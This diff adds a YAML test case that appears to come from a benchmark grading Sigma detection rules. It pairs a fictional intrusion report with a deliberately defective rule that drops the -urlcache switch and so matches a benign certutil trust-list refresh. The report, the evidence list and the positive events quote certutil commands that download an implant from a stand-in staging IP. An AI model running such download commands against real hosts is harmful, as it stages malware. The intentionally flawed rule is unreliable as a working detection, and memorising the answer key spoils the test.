@@ -1,0 +1,102 @@
+id: D9-06
+role: defective
+defect_class: D9
+evasive: true
+why: The rule requires certutil.exe with -split, -f and an http:// URL but drops the -urlcache switch
+  that characterises the download technique in the report. A scheduled trust-list refresh using certutil.exe
+  -verifyctl -f -split against an internal PKI host differs from the malicious command by one switch and
+  is matched.
+expected_gate: G10
+report_text: Tooling was staged through living-off-the-land downloads. The intruder used certutil.exe
+  to pull the implant from the staging server with the command certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe
+  C:\Users\Public\a.exe. This switch combination fetches the remote file through the CryptoAPI URL cache
+  and writes it to disk, sidestepping the browser's proxy settings. The implant was executed within seconds
+  of the download completing, by the same parent shell. In the telemetry the download command always carried
+  an HTTP URL beginning with http:// and always wrote to a path under the public profile folder. Certutil
+  was never otherwise used on these hosts during the intrusion window.
+evidence:
+- certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\Users\Public\a.exe
+- always carried an HTTP URL beginning with http://
+logsource: windows_process_creation
+techniques:
+- T1105
+sigma_yaml: |
+  title: Certutil Split Download Of Remote File Over HTTP
+  id: 4a2c88f1-d530-49b7-91ee-7b06c5a3d18f
+  status: experimental
+  description: Detects certutil.exe fetching a remote file over HTTP with the split and force switches, as used to stage the implant
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\certutil.exe'
+      CommandLine|contains|all:
+        - '-split'
+        - '-f'
+        - 'http://'
+    condition: selection
+  falsepositives:
+    - Unknown
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://203.0.113.45/stage/a.exe C:\Users\Public\a.exe
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\erin
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://203.0.113.45/stage/b.dll C:\Users\Public\b.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\erin
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -hashfile C:\Temp\setup.msi SHA256
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -store My
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -verifyctl -f -split http://pki.cranehealth.test/ctl/authrootstl.cab
+    parent: C:\Windows\System32\svchost.exe
+    parent_cmd: C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
